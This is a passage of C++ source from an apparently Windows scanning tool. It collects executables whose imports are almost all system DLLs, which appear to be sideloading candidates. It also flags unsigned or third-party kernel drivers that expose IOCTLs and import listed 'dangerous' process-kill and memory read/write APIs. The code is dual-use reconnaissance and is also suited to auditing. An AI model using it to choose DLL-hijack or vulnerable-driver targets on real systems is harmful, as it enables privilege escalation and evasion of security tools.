        std::filesystem::path finalPath = parentDir / finalName;
        if (std::filesystem::exists(finalPath)) {
            for (int dup = 2; dup <= 99; dup++) {
                finalPath = parentDir / (finalName + "(" + std::to_string(dup) + ")");
                if (!std::filesystem::exists(finalPath)) break;
            }
        }
        RenameDirectory(targetDir, finalPath.filename().string());
        targetDir = finalPath;

        try {
            if (!std::filesystem::exists(targetDir)) return;
            bool hasExe = false;
            bool hasDll = false;
            for (const auto& entry : std::filesystem::directory_iterator(targetDir)) {
                if (entry.is_regular_file()) {
                    auto ext = entry.path().extension().string();
                    if (ext == ".exe") hasExe = true;
                    else if (ext == ".dll") hasDll = true;
                }
            }

            if (!hasExe || !hasDll) {
                Sleep(200);
                DeleteDirectory(targetDir.string().c_str());
                std::filesystem::remove_all(targetDir);
            }
        } catch (...) {}
    }
}

void File_Output_exe(std::string filePath, std::vector<std::string>& DllList,
                     std::vector<std::string> result, bool is64Bit, bool isConsoleApp = false) {
    if (DllList.size()) {
        int iNum = 0;
        bool flag = false;
        for (const auto& dll : DllList) {
            for (const auto& part : result) {
                if (dll.find(part) != std::string::npos) {
                    flag = true;
                    break;
                }
            }
            if (flag) break;
            if (!Is_SystemDLL(dll.c_str())) {
                iNum += 1;
            }
        }
        if (iNum || flag) {
            std::cout << filePath << std::endl;
            return;
        } else {
            SetConsoleColor(FOREGROUND_GREEN);
            std::cout << "[+] " << filePath << std::endl;
            SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }

        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        std::filesystem::path currentDir = std::filesystem::path(currentPath).parent_path();
        std::filesystem::path targetDir;

        std::filesystem::path path(filePath);
        std::string exeType = isConsoleApp ? "cmd" : "gui";
        std::string exeStem = path.stem().string();
        std::string dirName = exeStem + "[" + exeType + "-" + std::to_string(DllList.size()) + "]";
        if (is64Bit) {
            targetDir = currentDir / "Eyebin" / "Exe" / "x64" / dirName;
        } else {
            targetDir = currentDir / "Eyebin" / "Exe" / "x86" / dirName;
        }

        if (!std::filesystem::exists(targetDir)) {
            std::filesystem::create_directories(targetDir);
        }

        std::string ExeName = path.filename().string();
        std::filesystem::copy_file(filePath, targetDir / ExeName, std::filesystem::copy_options::overwrite_existing);
    }
}

// ============================================================
// Driver (.sys) analysis — check IOCTL + dangerous APIs
// ============================================================
struct DriverAnalysis {
    bool hasIoctl = false;
    std::vector<std::string> dangerousApis;
    std::string signerName;  // empty = unsigned
    bool isMicrosoft = false;
};

DriverAnalysis AnalyzeDriver(const std::string& sysPath) {
    DriverAnalysis result;

    PEFile pe(sysPath);
    if (!pe.isValid()) return result;

    auto imports = pe.readImportDlls();
    // We need function-level imports, read from PE directly
    DWORD importRVA = pe.getDataDirectoryRVA(IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importRVA == 0) return result;

    auto* importDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(pe.fromRVA(importRVA));
    if (!importDesc) return result;

    // IOCTL indicators
    static const char* ioctlApis[] = {
        "IoCreateDevice", "IoCreateSymbolicLink", "IofCompleteRequest",
        "IoCreateDeviceSecure", nullptr
    };
    // Dangerous APIs
    static const char* dangerApis[] = {
        "ZwTerminateProcess", "NtTerminateProcess",
        "ZwOpenProcess", "NtOpenProcess",
        "ZwWriteFile", "NtWriteFile",
        "ZwDeleteFile", "NtDeleteFile",
        "ZwWriteVirtualMemory", "NtWriteVirtualMemory",
        "ZwReadVirtualMemory", "NtReadVirtualMemory",
        "MmCopyVirtualMemory",
        nullptr
    };

    while (importDesc->Name != 0) {
        auto* dllName = reinterpret_cast<char*>(pe.fromRVA(importDesc->Name));
        if (!dllName) break;

        DWORD thunkRVA = importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk;

        if (pe.is64Bit()) {
            auto* thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(pe.fromRVA(thunkRVA));
            if (!thunk) { importDesc++; continue; }
            while (thunk->u1.AddressOfData != 0) {
                if (!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)) {
                    auto* byName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                        pe.fromRVA((DWORD)(thunk->u1.AddressOfData)));
                    if (byName && byName->Name[0]) {
                        for (int i = 0; ioctlApis[i]; i++) {
                            if (strcmp(byName->Name, ioctlApis[i]) == 0) result.hasIoctl = true;
                        }
                        for (int i = 0; dangerApis[i]; i++) {
                            if (strcmp(byName->Name, dangerApis[i]) == 0)
                                result.dangerousApis.push_back(byName->Name);
                        }
                    }
                }
                thunk++;
            }
        } else {
            auto* thunk = reinterpret_cast<PIMAGE_THUNK_DATA32>(pe.fromRVA(thunkRVA));
            if (!thunk) { importDesc++; continue; }
            while (thunk->u1.AddressOfData != 0) {
                if (!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32)) {
                    auto* byName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                        pe.fromRVA(thunk->u1.AddressOfData));
                    if (byName && byName->Name[0]) {
                        for (int i = 0; ioctlApis[i]; i++) {
                            if (strcmp(byName->Name, ioctlApis[i]) == 0) result.hasIoctl = true;
                        }
                        for (int i = 0; dangerApis[i]; i++) {
                            if (strcmp(byName->Name, dangerApis[i]) == 0)
                                result.dangerousApis.push_back(byName->Name);
                        }
                    }
                }
                thunk++;
            }
        }
        importDesc++;
    }

    return result;
}

void Driver_File_Output(const std::string& sysPath, const DriverAnalysis& analysis) {
    SetConsoleColor(FOREGROUND_GREEN);
    std::cout << "[+] " << sysPath << "  [sys]" << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    if (!analysis.signerName.empty()) {
        std::cout << "    Signer: " << analysis.signerName << std::endl;
    } else {
        SetConsoleColor(FOREGROUND_RED);
        std::cout << "    Signer: UNSIGNED" << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }
    for (const auto& api : analysis.dangerousApis) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN); // yellow
        std::cout << "    [!] " << api << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    // Create output directory
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    std::filesystem::path currentDir = std::filesystem::path(currentPath).parent_path();
    std::filesystem::path sysFs(sysPath);
    std::string sysStem = sysFs.stem().string();

    uintmax_t fileSize = 0;
    try { fileSize = std::filesystem::file_size(sysPath); } catch (...) {}

    std::string dirName = sysStem + "[sys-" + FormatSize(fileSize) + "]";

    std::filesystem::path targetDir = currentDir / "Eyebin" / "Sys" / dirName;

    // Handle duplicates
    if (std::filesystem::exists(targetDir)) {
        for (int dup = 2; dup <= 99; dup++) {
            targetDir = currentDir / "Eyebin" / "Sys" / (dirName + "(" + std::to_string(dup) + ")");
            if (!std::filesystem::exists(targetDir)) break;
        }
    }
    std::filesystem::create_directories(targetDir);

    // Copy .sys file
    try {
        std::filesystem::copy_file(sysPath, targetDir / sysFs.filename(),
                                   std::filesystem::copy_options::overwrite_existing);
    } catch (...) { return; }

    // Write Info.txt into infos/
    std::filesystem::path infosDir = targetDir / "infos";
    std::filesystem::create_directories(infosDir);
    std::ofstream info(infosDir / "Info.txt");
    info << sysPath << std::endl;
    info << "Type: Kernel Driver" << std::endl;
    info << "Signer: " << (analysis.signerName.empty() ? "UNSIGNED" : analysis.signerName) << std::endl;
    info << "IOCTL: Yes" << std::endl;
    info << "\nDangerous APIs:" << std::endl;
    for (const auto& api : analysis.dangerousApis) {
        info << "  [!] " << api << std::endl;
    }
    info.close();
}

void ProcessSingleSysImpl(const std::string& fullPath) {
    // Skip Microsoft signed drivers — they're audited system components
    if (IsMicrosoftSigned(fullPath.c_str())) return;

    auto analysis = AnalyzeDriver(fullPath);
    if (!analysis.hasIoctl || analysis.dangerousApis.empty()) return;

    // Get signer info for output
    analysis.signerName = GetSignerName(fullPath.c_str());
    analysis.isMicrosoft = false; // already filtered above

    Driver_File_Output(fullPath, analysis);
}

void ProcessSingleSys(const std::string& fullPath) {
    __try {
        ProcessSingleSysImpl(fullPath);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetConsoleColor(FOREGROUND_RED);
        std::cerr << "[-] Crash processing: " << fullPath
                  << " (0x" << std::hex << GetExceptionCode() << std::dec << ")" << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }
}

// ============================================================
// Process a single exe file (extracted for SEH protection)
// ============================================================
void ProcessSingleExeImpl(const std::string& fullPath, int is64, int scanType,
                          bool isSign, bool isExe, std::vector<std::string>& result) {
    PEFile peCheck(fullPath);
    if (!peCheck.isValid()) return;

    bool is64Bit = peCheck.is64Bit();
    if ((is64Bit && is64 == 2) || (!is64Bit && is64 == 1)) return;

    bool isConsoleApp = (peCheck.getSubsystem() == IMAGE_SUBSYSTEM_WINDOWS_CUI);

    if (peCheck.isDotNet()) {
        if (!(scanType & SCAN_DOTNET)) return;
        if (isSign && !IsFileSigned(fullPath.c_str())) return;
        auto dotnetResult = DotNet::Analyze(fullPath, peCheck);
        FilterPInvokeTargets(dotnetResult);
        DotNet_File_Output(fullPath, is64Bit, is64, dotnetResult);
        return;
    }

    // Native PE — filter by gui/cmd
    if (isConsoleApp && !(scanType & SCAN_CMD)) return;
    if (!isConsoleApp && !(scanType & SCAN_GUI)) return;

    std::vector<std::string> DllList = peCheck.readImportDlls();

    if (isExe) {
        if (isSign) {
            if (IsFileSigned(fullPath.c_str()))
                File_Output_exe(fullPath.c_str(), DllList, result, is64Bit, isConsoleApp);
        } else {
            File_Output_exe(fullPath.c_str(), DllList, result, is64Bit, isConsoleApp);
        }
    } else {
        if (isSign) {
            if (IsFileSigned(fullPath.c_str()))
                File_Output(fullPath.c_str(), DllList, is64Bit, is64, result, isConsoleApp);
        } else {
            File_Output(fullPath.c_str(), DllList, is64Bit, is64, result, isConsoleApp);
        }
    }
}

// SEH wrapper per file — access violation on one file won't kill the scan
void ProcessSingleExe(const std::string& fullPath, int is64, int scanType,
                      bool isSign, bool isExe, std::vector<std::string>& result) {
    __try {
        ProcessSingleExeImpl(fullPath, is64, scanType, isSign, isExe, result);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        SetConsoleColor(FOREGROUND_RED);
        std::cerr << "[-] Crash processing: " << fullPath
                  << " (0x" << std::hex << GetExceptionCode() << std::dec << ")" << std::endl;
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }
}

bool hasReadPermission(const std::string& path) {
    // Skip paths exceeding MAX_PATH silently (common in node_modules, etc.)
    if (path.size() >= MAX_PATH) return false;

    struct _stat fileInfo;
    if (_stat(path.c_str(), &fileInfo) != 0) {
        if (errno == EACCES) {
            SetConsoleColor(FOREGROUND_RED);
            std::cerr << "[-] Permission denied: " << path << std::endl;
            SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        }
        // Silently skip ENOENT (error code 2) — usually long path or junction issues
        return false;
    }
    return true;
}

void getFiles_and_view(const std::string& path, int is64, int scanType, bool isSign, bool isExe, std::vector<std::string> result) {
    if (!hasReadPermission(path)) return;

    std::filesystem::path basePath(path);

    intptr_t hFile = 0;
    struct _finddata_t fileinfo;
    std::string searchPath = (basePath / "*").string();

    if ((hFile = _findfirst(searchPath.c_str(), &fileinfo)) == -1) {
        return;
    }

    do {
        if (fileinfo.attrib & _A_SUBDIR) {
            if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0) {
                if (fileinfo.name[0] != '$') {
                    std::string subdirPath = (basePath / fileinfo.name).string();
                    if (subdirPath.find("Eyebin") == std::string::npos) {
                        getFiles_and_view(subdirPath, is64, scanType, isSign, isExe, result);
                    }
                }
            }
        } else {
            std::string fullPath = (basePath / fileinfo.name).string();

            std::filesystem::path fp(fullPath);
            auto ext = fp.extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (ext == ".exe" && (scanType & (SCAN_GUI | SCAN_CMD | SCAN_DOTNET))) {
                ProcessSingleExe(fullPath, is64, scanType, isSign, isExe, result);
            } else if (ext == ".sys" && (scanType & SCAN_SYS)) {
                ProcessSingleSys(fullPath);
            }
        }
    } while (_findnext(hFile, &fileinfo) == 0);

    _findclose(hFile);
}
